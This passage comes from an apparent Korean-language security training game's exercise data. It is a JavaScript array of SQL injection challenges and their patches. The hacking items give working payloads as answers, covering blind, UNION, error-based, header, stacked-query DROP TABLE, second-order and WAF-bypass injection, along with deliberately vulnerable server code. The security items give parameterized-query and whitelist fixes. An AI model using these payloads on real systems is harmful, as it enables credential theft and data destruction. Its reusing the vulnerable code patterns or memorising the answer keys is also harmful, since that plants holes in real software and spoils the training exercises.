검색창에 아무 글자 없이 <code class="pt-answer">%</code> 기호 딱 하나만 넣으면 어떻게 될까요?<br>
쿼리가 <code>LIKE '%%%'</code> 가 되어 <b>"이름에 어떤 글자가 들어있든 전부 다 가져와라"</b>라는 뜻이 되어버립니다. 클릭 한 번으로 모든 회원 정보가 화면에 노출돼요!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 검색창에 키보드의 % 기호 딱 한 글자만 입력하고 [검색]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">%</code>`,
    code: `const name = req.query.name;
const query = \`SELECT * FROM members WHERE name LIKE '%\${name}%'\`;
const rows = await db.query(query);`,
    language: 'sql',
    hint: "정답은 [%] 입니다. 키보드 Shift + 5를 눌러 퍼센트 기호 하나만 입력해 보세요!"
  },
  {
    id: 'sq_h_m_1',
    title: '[실전] 불리언 기반 블라인드 SQL Injection',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-89',
    answer: "1' AND SUBSTRING(password,1,1)='a'--",
    flag: 'FLAG{BOOLEAN_BLIND_SQLI_MASTERED}',
    mockUi: {
      urlBar: 'target.local/account/status?id=',
      siteLabel: '🔎 회원 활성 상태 확인',
      fieldLabel: '회원 ID',
      fieldPlaceholder: '확인할 회원 ID',
      buttonLabel: '확인',
    },
    desc: `화면에 쿼리 결과가 직접 출력되지 않고 '활성/비활성'과 같은 참/거짓 신호만 주어지는 경우, 조건문을 하나씩 넣어 응답 차이로 데이터를 한 글자씩 추출할 수 있습니다.
<div class='code-snippet'>SELECT * FROM users WHERE id='<span style="color:#f87171;">[여러분이 입력한 회원 ID]</span>' AND status='active'</div>
관리자(id=1)의 비밀번호 첫 글자가 'a'인지 참/거짓으로 확인하는 블라인드 페이로드를 아래 "회원 ID" 칸에 직접 구성해서 입력하십시오. Tutorial/Easy와 달리 이번엔 정답 형식을 미리 알려드리지 않으니, 위 설명을 바탕으로 SQL 문법에 맞게 스스로 조립해 보세요.`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM users WHERE id='\${id}' AND status='active'\`;
const user = await db.query(query);
res.json({ loggedIn: !!user });  // 참/거짓만 응답으로 노출됨`,
    language: 'sql',
    hint: "SUBSTRING(컬럼명, 시작위치, 길이) 함수로 글자를 하나 잘라내고, 그 결과가 특정 문자와 같은지(=) 비교하는 조건을 AND로 원래 쿼리에 이어붙이세요. 맨 앞은 작은따옴표로 원래 문자열을 먼저 닫아야 합니다."
  },
  {
    id: 'sq_h_m_2',
    title: '[실전] 시간 지연 기반 블라인드 SQL Injection',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Medium',
    xp: 190,
    cwe: 'CWE-89',
    answer: "1' AND IF(1=1,SLEEP(5),0)--",
    flag: 'FLAG{TIME_BASED_BLIND_SLEEP_SUCCESS}',
    mockUi: {
      urlBar: 'target.local/account/status?id=',
      siteLabel: '🔎 회원 활성 상태 확인',
      fieldLabel: '회원 ID',
      fieldPlaceholder: '확인할 회원 ID',
      buttonLabel: '확인',
    },
    desc: `화면에 참/거짓 신호조차 드러나지 않는 완전 블라인드 환경에서는 조건이 참일 때만 응답을 지연시켜(SLEEP) 응답 시간 차이로 데이터를 추론합니다.
<div class='code-snippet'>SELECT * FROM users WHERE id='<span style="color:#f87171;">[여러분이 입력한 회원 ID]</span>'</div>
조건이 참(1=1)이면 5초간 응답을 지연시키는 시간 기반 블라인드 페이로드를 아래 "회원 ID" 칸에 직접 구성해서 입력하십시오. 정답 형식은 미리 알려드리지 않으니, 위 설명을 바탕으로 스스로 조립해 보세요.`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM users WHERE id='\${id}'\`;
await db.query(query); // 응답 시간을 스톱워치로 측정하여 참/거짓 판별`,
    language: 'sql',
    hint: "IF(조건, 참일 때 실행할 것, 거짓일 때 실행할 것) 문법과 SLEEP(초) 함수를 조합해서, 조건이 참일 때만 응답이 느려지도록 만들어 보세요. AND로 원래 쿼리에 이어붙이는 것도 잊지 마세요."
  },
  {
    id: 'sq_h_m_3',
    title: '[실전] Tutorial 페이로드를 확장한 UNION 데이터 탈취',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Medium',
    xp: 185,
    cwe: 'CWE-89',
    answer: "admin' UNION SELECT null, password, null FROM users--",
    flag: 'FLAG{TUTORIAL_PAYLOAD_EXTENDED_UNION}',
    mockUi: {
      urlBar: 'target.local/login',
      siteLabel: '🔐 TargetSite 로그인',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: '아이디를 입력하세요',
      buttonLabel: '로그인',
      extraFieldLabel: '비밀번호 (PW)',
    },
    desc: `Tutorial에서 썼던 <code>admin'--</code> 는 인증만 우회할 뿐이었습니다. 그런데 이 로그인 페이지는 성공 시 <code>id, username, role</code> 3개 컬럼을 그대로 화면에 출력합니다. 인증 우회에 쓰던 바로 그 지점에 <code>UNION SELECT</code>를 끼워넣으면, 로그인은 그대로 우회하면서 동시에 다른 테이블의 데이터까지 화면에 출력시킬 수 있습니다.
<div class='code-snippet'>SELECT id, username, role FROM users WHERE id='<span style="color:#f87171;">[여러분이 입력한 id 값]</span>' AND pw='...'</div>
👉 아래 로그인 폼의 아이디 칸에, <b>Tutorial에서 썼던 admin' 페이로드를 그대로 시작점으로 삼아</b> UNION SELECT로 users 테이블의 password 컬럼까지 함께 출력되도록 확장해서 입력하십시오 (컬럼 개수는 3개를 유지해야 합니다). 정답 형식은 미리 알려드리지 않습니다.`,
    code: `app.post('/login', async (req, res) => {
  const query = \`SELECT id, username, role FROM users WHERE id='\${req.body.id}' AND pw='\${req.body.pw}'\`;
  const rows = await db.query(query);
  res.render('result', { rows }); // 쿼리 결과 3개 컬럼을 그대로 화면에 출력
});`,
    language: 'javascript',
    hint: "Tutorial의 admin' 뒤에, 곧바로 UNION SELECT를 이어붙여 보세요. 원본 쿼리가 3개 컬럼(id, username, role)을 반환하므로 UNION 쪽도 컬럼 3개를 맞춰야 하고, 필요 없는 자리는 null로 채우면 됩니다. 마지막은 -- 로 주석 처리하세요."
  },
  {
    id: 'sq_h_m_4',
    title: '[실전] 에러 기반(Error-Based) SQL Injection',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Medium',
    xp: 185,
    cwe: 'CWE-89',
    answer: "' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--",
    flag: 'FLAG{ERROR_BASED_EXTRACTVALUE_LEAK}',
    mockUi: {
      urlBar: 'target.local/account/status?id=',
      siteLabel: '🔎 회원 활성 상태 확인',
      fieldLabel: '회원 ID',
      fieldPlaceholder: '확인할 회원 ID',
      buttonLabel: '확인',
    },
    desc: `이 페이지는 참/거짓에 따른 화면 차이가 없어서 Medium 1의 불리언 블라인드 기법을 그대로 쓸 수 없습니다. 대신 서버가 DB 에러 메시지를 화면에 그대로 출력해줍니다. MySQL의 <code>extractvalue()</code> 함수는 두 번째 인자로 잘못된 XPath 문자열을 주면 그 값을 에러 메시지 안에 그대로 포함시켜 돌려줍니다 — 이 성질을 이용해 데이터를 에러 메시지를 통해 훔쳐올 수 있습니다.
<div class='code-snippet'>SELECT * FROM accounts WHERE id='<span style="color:#f87171;">[여러분이 입력한 id 값]</span>'</div>
<code>concat(0x7e, ...)</code>는 결과 앞에 물결표(~)를 붙여 에러 메시지 안에서 우리가 원하는 값이 어디부터인지 눈에 띄게 해줍니다.
👉 users 테이블의 password 컬럼 첫 번째 값을 에러 메시지를 통해 유출시키는 extractvalue 기반 페이로드를 직접 구성해서 아래 회원 ID 칸에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM accounts WHERE id='\${id}'\`;
try {
  const row = await db.query(query);
} catch (err) {
  res.send(err.message); // DB 에러 메시지를 그대로 화면에 출력 (디버그 모드가 꺼지지 않음)
}`,
    language: 'sql',
    hint: "' AND extractvalue(1,concat(0x7e,(SELECT ...)))-- 형태입니다. 작은따옴표로 원래 문자열을 닫고 AND로 이어붙인 뒤, extractvalue 함수 안에 훔쳐올 서브쿼리를 넣으세요."
  },
  {
    id: 'sq_h_m_5',
    title: '[실전] HTTP 헤더(User-Agent) 기반 SQL Injection',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Medium',
    xp: 180,
    cwe: 'CWE-89',
    answer: "test' OR '1'='1",
    flag: 'FLAG{USER_AGENT_HEADER_SQLI}',
    desc: `지금까지 배운 주입 지점은 전부 폼 입력값이나 URL 파라미터였습니다. 그런데 서버 코드를 보니, 접속 로그를 남기는 과정에서 브라우저가 자동으로 보내는 <code>User-Agent</code> 헤더 값도 검증 없이 그대로 SQL 쿼리에 이어붙이고 있습니다. 즉 화면에 보이는 입력창이 아니어도, 요청에 실려가는 어떤 값이든 주입 지점이 될 수 있습니다.
<div class='code-snippet'>INSERT INTO access_logs (user_agent) VALUES ('<span style="color:#f87171;">[요청의 User-Agent 헤더 값이 여기 그대로 들어감]</span>')</div>
Tutorial에서 배운 Tautology 기법(<code>' OR '1'='1</code>)을 그대로 이 자리에 적용하면 됩니다. 다만 이 값은 브라우저가 자동으로 만드는 문자열의 시작 부분이므로, 그 앞에 아무 이름이나 붙여서 흉내내도 됩니다.
👉 터미널 입력창에 User-Agent 헤더 값으로 위조해서 보낼 페이로드를 직접 구성해서 입력하십시오 (앞부분에 아무 이름 "test"를 붙이고 Tutorial에서 배운 Tautology 기법을 그대로 이어붙이세요). 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const ua = req.headers['user-agent'];
const query = \`INSERT INTO access_logs (user_agent) VALUES ('\${ua}')\`;
await db.query(query); // User-Agent 헤더 값을 검증 없이 그대로 사용`,
    language: 'sql',
    hint: "Tutorial에서 배운 ' OR '1'='1 앞에 test 라는 이름을 붙여서, test' OR '1'='1 형태로 그대로 이어붙이면 됩니다."
  },
  {
    id: 'sq_h_h_1',
    title: '[고급] Stacked Query로 임의 SQL 실행',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Hard',
    xp: 260,
    cwe: 'CWE-89',
    answer: "1'; DROP TABLE logs;--",
    flag: 'FLAG{STACKED_QUERY_EXECUTION_CRITICAL}',
    mockUi: {
      urlBar: 'target.local/posts/view?id=',
      siteLabel: '📄 게시글 조회',
      fieldLabel: '게시글 번호 (id)',
      fieldPlaceholder: '조회할 게시글 번호',
      buttonLabel: '조회',
    },
    desc: `일부 드라이버는 세미콜론(;)으로 구분된 여러 개의 쿼리를 한 번에 실행하는 것을 허용합니다. 이 경우 SELECT뿐 아니라 DROP, INSERT, UPDATE 같은 임의의 명령까지 함께 실행시킬 수 있어 SQLi 중에서도 가장 파괴적인 유형입니다.
<div class='code-snippet'>SELECT * FROM posts WHERE id='<span style="color:#f87171;">[여러분이 입력한 게시글 번호]</span>'</div>
원본 쿼리 뒤에 <code>logs</code> 테이블을 삭제하는 두 번째 쿼리를 이어붙이는 페이로드를 아래 "게시글 번호" 칸에 직접 구성해서 입력하십시오. 정답 형식은 미리 알려드리지 않으니, 위 설명을 바탕으로 스스로 조립해 보세요.`,
    code: `const id = req.query.id;
// mysqli의 multi_query 또는 pg의 simple query 모드처럼
// 세미콜론으로 여러 쿼리를 한번에 허용하는 드라이버 사용 중
const query = \`SELECT * FROM posts WHERE id='\${id}'\`;
await connection.query(query);`,
    language: 'sql',
    hint: "작은따옴표로 원래 문자열을 먼저 닫고, 세미콜론(;)으로 새 SQL 문을 시작해 DROP TABLE 문을 실행해 보세요. 마지막엔 남은 원본 쿼리 부분을 주석 처리해야 문법 오류가 나지 않습니다."
  },
  {
    id: 'sq_h_h_2',
    title: '[고급] 2차(Second-Order) SQL Injection',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Hard',
    xp: 270,
    cwe: 'CWE-89',
    answer: "' OR '1'='1",
    flag: 'FLAG{SECOND_ORDER_SQLI_MASTERED}',
    mockUi: {
      urlBar: 'target.local/register',
      siteLabel: '🆕 회원가입',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: '사용할 아이디를 입력하세요',
      buttonLabel: '가입하기',
    },
    desc: `지금까지는 입력이 들어오는 지점에서 바로 SQLi가 터졌습니다. 하지만 이번엔 다릅니다. 회원가입 시 아이디는 파라미터화된 쿼리로 안전하게 저장되지만, 나중에 "최근 활동" 조회 기능이 그 저장된 값을 다시 꺼내와 검증 없이 새 쿼리 문자열에 그대로 이어붙입니다. 즉 입력이 들어오는 지점(회원가입)과 실제로 터지는 지점(활동 조회)이 서로 다릅니다 — 이런 패턴을 2차(Second-Order) SQL Injection이라고 부릅니다.
<div class='code-snippet'>// ① 회원가입 — 파라미터화되어 안전하게 저장됨<br>db.query('INSERT INTO users (username) VALUES (?)', [username]);<br><br>// ② (나중에) 최근 활동 조회 — 저장된 값을 그대로 재사용, 검증 없이 문자열 결합<br>db.query(\`SELECT * FROM logs WHERE username = '<span style="color:#f87171;">[가입 시 저장된 아이디 값]</span>'\`);</div>
👉 아래 회원가입 폼의 아이디 칸에 값을 입력해서, 나중에 ②번 쿼리가 실행될 때 조건이 무조건 참이 되어 모든 사용자의 활동 로그가 노출되도록 만드십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// 회원가입 라우트 — 파라미터화되어 안전함
app.post('/register', async (req, res) => {
  await db.query('INSERT INTO users (username) VALUES (?)', [req.body.username]);
});

// 최근 활동 조회 라우트 — 저장된 username을 검증 없이 재사용
app.get('/activity/:username', async (req, res) => {
  const storedUsername = req.params.username;
  const rows = await db.query(\`SELECT * FROM logs WHERE username = '\${storedUsername}'\`);
  res.json(rows);
});`,
    language: 'javascript',
    hint: "회원가입 때 입력한 값 자체는 그 순간엔 안전하게 저장되지만, 나중에 다른 기능에서 검증 없이 재사용되고 있습니다. Tutorial에서 배운 '항상 참'이 되는 조건 기법을 떠올려 보세요 — 그 값을 지금 아이디 칸에 입력해 두면, 나중에 재사용되는 순간 터집니다."
  },
  {
    id: 'sq_h_h_3',
    title: '[고급] 2차 SQL Injection과 UNION 추출의 결합',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Hard',
    xp: 275,
    cwe: 'CWE-89',
    answer: "' UNION SELECT username,password FROM users--",
    flag: 'FLAG{SECOND_ORDER_UNION_COMBO}',
    mockUi: {
      urlBar: 'target.local/register',
      siteLabel: '🆕 회원가입',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: '사용할 아이디를 입력하세요',
      buttonLabel: '가입하기',
    },
    desc: `앞에서 배운 두 기법을 하나로 합칠 차례입니다. 2차 SQL Injection에서처럼, 회원가입 시 저장한 아이디 값이 나중에 "최근 활동" 조회에서 검증 없이 재사용됩니다. 이번엔 단순히 조건을 참으로 만드는 대신, Easy에서 배운 UNION SELECT 기법을 결합해서 재사용되는 순간 users 테이블의 비밀번호까지 함께 훔쳐오도록 만들어 보세요. logs 테이블은 <code>username, action</code> 2개 컬럼입니다.
<div class='code-snippet'>// 회원가입 — 안전하게 저장됨<br>db.query('INSERT INTO users (username) VALUES (?)', [username]);<br><br>// 최근 활동 조회 — 저장된 값을 검증 없이 재사용 (logs 테이블은 username, action 2개 컬럼)<br>db.query(\`SELECT * FROM logs WHERE username = '<span style="color:#f87171;">[가입 시 저장된 아이디 값]</span>'\`);</div>
👉 아래 회원가입 폼의 아이디 칸에 값을 입력해서, 나중에 활동 조회 쿼리가 재사용될 때 users 테이블의 username, password가 함께 노출되도록 만드십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// 회원가입 라우트 — 파라미터화되어 안전함
app.post('/register', async (req, res) => {
  await db.query('INSERT INTO users (username) VALUES (?)', [req.body.username]);
});

// 최근 활동 조회 라우트 — 저장된 username을 검증 없이 재사용 (logs: username, action 2컬럼)
app.get('/activity/:username', async (req, res) => {
  const storedUsername = req.params.username;
  const rows = await db.query(\`SELECT * FROM logs WHERE username = '\${storedUsername}'\`);
  res.json(rows);
});`,
    language: 'javascript',
    hint: "logs 테이블이 2개 컬럼(username, action)이므로, UNION SELECT 쪽도 컬럼 2개를 맞춰야 합니다. users 테이블에서 훔쳐올 두 값(username, password)을 그 자리에 넣고, 앞에는 작은따옴표로 원래 문자열을 닫는 것부터 시작하세요."
  },
  {
    id: 'sq_h_h_4',
    title: '[고급] WAF 우회 — 공백 필터링을 주석으로 대체',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Hard',
    xp: 275,
    cwe: 'CWE-89',
    answer: "'/**/OR/**/'1'='1",
    flag: 'FLAG{WAF_SPACE_FILTER_BYPASSED}',
    mockUi: {
      urlBar: 'target.local/login',
      siteLabel: '🔐 TargetSite 로그인 (WAF 적용됨)',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: '아이디를 입력하세요',
      buttonLabel: '로그인',
      extraFieldLabel: '비밀번호 (PW)',
    },
    desc: `Tutorial에서 배운 <code>' OR '1'='1</code> 을 그대로 입력했더니 이번엔 "차단되었습니다"라는 메시지가 뜹니다. 방화벽(WAF)이 <code>OR</code> 앞뒤에 공백이 있는 패턴을 감지해서 막고 있는 것으로 보입니다.
<div class='code-snippet'>if (/\\s(OR|AND)\\s/i.test(input)) return res.status(403).send('차단되었습니다');<br>const query = \`SELECT * FROM users WHERE id='\${input}' AND pw='...'\`;</div>
SQL 문법에서는 공백 대신 인라인 주석 <code>/**/</code>도 토큰을 구분하는 역할을 할 수 있습니다. 즉 <code>OR</code> 앞뒤의 공백을 <code>/**/</code>로 바꿔치기하면, WAF의 공백 패턴 탐지는 피하면서도 DB는 여전히 같은 의미로 해석합니다.
👉 Tutorial의 Tautology 페이로드(<code>' OR '1'='1</code>)에서, <code>OR</code> 앞뒤 공백을 모두 <code>/**/</code>로 바꿔서 WAF를 우회하는 페이로드를 아래 로그인 폼의 아이디 칸에 직접 구성해서 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `function isBlocked(input) {
  return /\\s(OR|AND)\\s/i.test(input); // 공백으로 둘러싸인 OR/AND만 탐지함
}
if (isBlocked(username)) return res.status(403).send('차단되었습니다');
const query = \`SELECT * FROM users WHERE id='\${username}' AND pw='\${password}'\`;`,
    language: 'javascript',
    hint: "Tutorial의 ' OR '1'='1 에서, OR 앞뒤 공백 두 곳을 각각 /**/ 로 바꿔치기하면 됩니다."
  },
  {
    id: 'sq_h_h_5',
    title: '[고급] 블라인드 SQLi로 비밀번호 길이부터 알아내기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Hard',
    xp: 280,
    cwe: 'CWE-89',
    answer: "1' AND LENGTH(password)=8--",
    flag: 'FLAG{BLIND_LENGTH_DISCOVERY_COMPLETE}',
    mockUi: {
      urlBar: 'target.local/account/status?id=',
      siteLabel: '🔎 회원 활성 상태 확인',
      fieldLabel: '회원 ID',
      fieldPlaceholder: '확인할 회원 ID',
      buttonLabel: '확인',
    },
    desc: `Medium에서 배운 불리언 블라인드 기법으로 비밀번호를 한 글자씩 추측하려고 합니다. 그런데 몇 번째 글자까지 추측해야 끝인지 모른다면 언제 멈춰야 할지 알 수 없습니다. 본격적으로 글자를 하나씩 추측하기 전에, 먼저 비밀번호 전체 길이가 몇 자리인지부터 알아내는 것이 효율적입니다.
<div class='code-snippet'>SELECT * FROM accounts WHERE id='<span style="color:#f87171;">[여러분이 입력한 id 값]</span>'</div>
<code>LENGTH()</code> 함수는 문자열의 길이를 돌려줍니다. Medium에서 배운 <code>SUBSTRING(...)='a'</code> 대신, 이번엔 <code>LENGTH(password)=숫자</code> 형태의 조건을 넣어서 참/거짓 응답 차이로 길이를 하나씩 맞춰볼 수 있습니다 (이 실습에서는 8자리로 확인되었다고 가정하고 8을 제출).
👉 Medium에서 배운 불리언 블라인드 구조를 재사용하되, <code>SUBSTRING</code> 대신 <code>LENGTH(password)=8</code> 조건으로 바꾼 페이로드를 직접 구성해서 아래 회원 ID 칸에 입력하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM accounts WHERE id='\${id}'\`;
const row = await db.query(query);
res.send(row ? '활성 계정입니다' : '존재하지 않는 계정입니다'); // 참/거짓에 따라 응답 문구가 다름`,
    language: 'sql',
    hint: "Medium의 1' AND SUBSTRING(password,1,1)='a'-- 구조에서, SUBSTRING(...)='a' 부분을 LENGTH(password)=8 로 바꿔보세요."
  },
  {
    id: 'sq_s_e_1',
    title: '[실전 Level 1] Node.js mysql2 물음표(?) 파라미터 분리 패치',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-89',
    answer: "connection.query('SELECT * FROM users WHERE id = ?', [id]);",
    flag: 'FLAG{MYSQL2_PLACEHOLDER_PATCHED}',
    desc: `🌟 <b>어떤 상황인가요? (포장 배달 비유)</b><br>
사용자가 보낸 값(id)을 쿼리 문장에 직접 섞어 넣지 않고, <code>?</code> 자리를 만들어 둔 뒤 <b>따로 밀봉된 상자(배열 <code>[id]</code>)</b>에 담아 데이터베이스에 보내주는 시큐어 코딩 기법이에요.

🔍 <b>보안 패치의 핵심</b><br>
<code>connection.query('SELECT * FROM users WHERE id = ?', [id]);</code> 처럼 작성하면, mysql2 드라이버가 입력값을 완벽하게 데이터로 격리시켜 SQL 인젝션 공격이 100% 차단됩니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 파라미터 바인딩 코드 한 줄을 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">connection.query('SELECT * FROM users WHERE id = ?', [id]);</code>`,
    code: `// 취약한 코드 (백틱 문자열 직접 삽입)
const query = \`SELECT * FROM users WHERE id = \${id}\`;
connection.query(query);

// [보안 패치: ? 플레이스홀더와 [id] 배열 분리]`,
    language: 'javascript',
    hint: "정답은 [connection.query('SELECT * FROM users WHERE id = ?', [id]);] 입니다. 복사해서 터미널 창에 붙여넣고 실행해 보세요!"
  },
  {
    id: 'sq_s_e_2',
    title: '[실전 Level 1] Python DB-API %s 자리표시자 바인딩 패치',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-89',
    answer: "cursor.execute('SELECT * FROM users WHERE id = %s', (id,))",
    flag: 'FLAG{PYTHON_DBAPI_PARAM_SECURED}',
    desc: `🌟 <b>어떤 상황인가요?</b><br>
파이썬에서 흔히 쓰는 f-string(<code>f"SELECT ... {id}"</code>)은 사용자의 위험한 입력값까지 쿼리 문장으로 합쳐버려 매우 위험해요!

🔍 <b>보안 패치의 핵심</b><br>
문자열 조합 대신 <code>%s</code> 자리표시자를 쓰고, 파라미터는 튜플 <code>(id,)</code> 형태로 두 번째 인자에 넘겨줍니다.<br>
이렇게 하면 파이썬 DB 드라이버가 알아서 안전하게 특수문자를 무력화해 줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 cursor.execute 코드를 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">cursor.execute('SELECT * FROM users WHERE id = %s', (id,))</code>`,
    code: `# 취약한 코드 (f-string 직접 삽입)
query = f"SELECT * FROM users WHERE id = {id}"
cursor.execute(query)

# [보안 패치: %s 자리표시자와 (id,) 튜플 분리]`,
    language: 'python',
    hint: "정답은 [cursor.execute('SELECT * FROM users WHERE id = %s', (id,))] 입니다. 쉼표가 들어간 (id,) 튜플 형태를 확인하세요."
  },
  {
    id: 'sq_s_e_3',
    title: '[실전 Level 1] PHP PDO 물음표 바인딩 패치',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Easy',
    xp: 115,
    cwe: 'CWE-89',
    answer: "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);",
    flag: 'FLAG{PHP_PDO_PREPARED_SECURED}',
    desc: `🌟 <b>어떤 상황인가요?</b><br>
PHP 웹사이트에서 점(<code>.</code>)으로 문자열을 억지로 이어붙이는 방식(<code>... WHERE id = " . $_GET['id']</code>)은 대표적인 해킹 통로입니다.

🔍 <b>보안 패치의 핵심: 2단계 안전 분리</b><br>
1. <code>$pdo->prepare('... WHERE id = ?')</code> 로 안전한 질문 뼈대를 먼저 준비합니다.<br>
2. <code>$stmt->execute([$id])</code> 로 실제 값만 배열에 담아 안전하게 실행합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 두 단계 패치 코드를 한 줄로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);</code>`,
    code: `// 취약한 코드
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = $pdo->query($query);

// [보안 패치: prepare() + execute([$id]) 적용]`,
    language: 'php',
    hint: "정답은 [$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'sq_s_e_4',
    title: '[실전 Level 1] Ruby ActiveRecord 파라미터 바인딩 패치',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Easy',
    xp: 115,
    cwe: 'CWE-89',
    answer: "User.where('id = ?', id)",
    flag: 'FLAG{ACTIVERECORD_PARAM_BOUND}',
    desc: `🌟 <b>어떤 상황인가요?</b><br>
Ruby on Rails 프레임워크에서도 문자열 보간(<code>#{params[:id]}</code>)을 쓰면 SQL 주입 공격에 무방비로 뚫립니다.

🔍 <b>보안 패치의 핵심</b><br>
문자열 안에 변수를 직접 끼워넣지 말고, <code>where('id = ?', id)</code> 처럼 물음표와 변수를 쉼표로 분리해주면 ActiveRecord가 알아서 안전하게 방어합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 안전한 where 절 코드를 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">User.where('id = ?', id)</code>`,
    code: `# 취약한 코드
User.where("id = #{params[:id]}")

# [보안 패치: ? 플레이스홀더 사용]`,
    language: 'ruby',
    hint: "정답은 [User.where('id = ?', id)] 입니다. 큰따옴표 보간 대신 작은따옴표와 쉼표로 분리하세요."
  },
  {
    id: 'sq_s_m_1',
    title: '[패치] ORDER BY 컬럼명 화이트리스트 검증',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-89',
    answer: "const allowed = ['title','author','created_at']; if (!allowed.includes(sortBy)) throw new Error('invalid column');",
    flag: 'FLAG{ORDER_BY_WHITELIST_ENFORCED}',
    desc: `<code>ORDER BY</code> 뒤에 오는 컬럼명은 값이 아니라 식별자이기 때문에 Prepared Statement의 <code>?</code> 바인딩으로 막을 수 없습니다. 이런 경우 반드시 허용된 컬럼명 목록(화이트리스트)과 정확히 일치하는지 검증해야 합니다.
<div class='code-snippet'>SELECT * FROM posts ORDER BY <span style="color:#f87171;">\${sortBy}</span></div>
👉 사용자가 보낸 <code>sortBy</code> 값이 허용된 컬럼명(title, author, created_at) 목록에 있는지 검증하고, 없으면 예외를 던지는 방어 코드를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `const sortBy = req.query.sortBy;
// 취약한 코드: 검증 없이 바로 쿼리에 삽입
const query = \`SELECT * FROM posts ORDER BY \${sortBy}\`;

// [패치 필요: 화이트리스트 검증]`,
    language: 'javascript',
    hint: "const allowed = ['title','author','created_at']; if (!allowed.includes(sortBy)) throw new Error('invalid column'); 를 그대로 입력하세요 (공백까지 정확히)."
  },
  {
    id: 'sq_s_m_2',
    title: '[패치] 2차 SQL Injection 방어 - 재사용 시점 파라미터화',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Medium',
    xp: 175,
    cwe: 'CWE-89',
    answer: "db.query('SELECT * FROM logs WHERE username = ?', [storedUsername]);",
    flag: 'FLAG{SECOND_ORDER_PATCH_APPLIED}',
    desc: `Hacking 트랙에서 봤던 것처럼, 저장 시점엔 파라미터화되어 안전해도 나중에 그 값을 재사용하는 시점에 다시 문자열로 결합해버리면 2차(Second-Order) SQL Injection에 노출됩니다. 회원가입은 이미 안전하게 파라미터화되어 있지만, "최근 활동" 조회 코드가 저장된 값을 검증 없이 재사용하고 있습니다.
<div class='code-snippet'>// 이미 안전함<br>db.query('INSERT INTO users (username) VALUES (?)', [username]);<br><br>// 취약함 — 재사용 시점에 파라미터화가 빠짐<br>db.query(\`SELECT * FROM logs WHERE username = '<span style="color:#f87171;">\${storedUsername}</span>'\`);</div>
👉 재사용 시점의 쿼리도 <code>?</code> 플레이스홀더로 파라미터화하십시오. 정답 형식은 미리 알려드리지 않습니다. 위 설명과 힌트를 참고해 구성해 보세요.`,
    code: `// 회원가입 — 이미 안전함
db.query('INSERT INTO users (username) VALUES (?)', [username]);

// 최근 활동 조회 — 저장된 값을 검증 없이 재사용 (패치 필요)
db.query(\`SELECT * FROM logs WHERE username = '\${storedUsername}'\`);`,
    language: 'javascript',
    hint: "db.query('...WHERE username = ?', [storedUsername]) 형태로, 문자열 결합 대신 ? 플레이스홀더와 파라미터 배열을 분리하세요."
  },
  {
    id: 'sq_s_m_3',
    title: '[패치] 숫자형 파라미터 강제 형변환으로 방어',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Medium',
    xp: 175,
    cwe: 'CWE-89',
    answer: "const id = parseInt(req.query.id, 10); if (Number.isNaN(id)) throw new Error('invalid id');",
    flag: 'FLAG{NUMERIC_PARAM_COERCION_ENFORCED}',
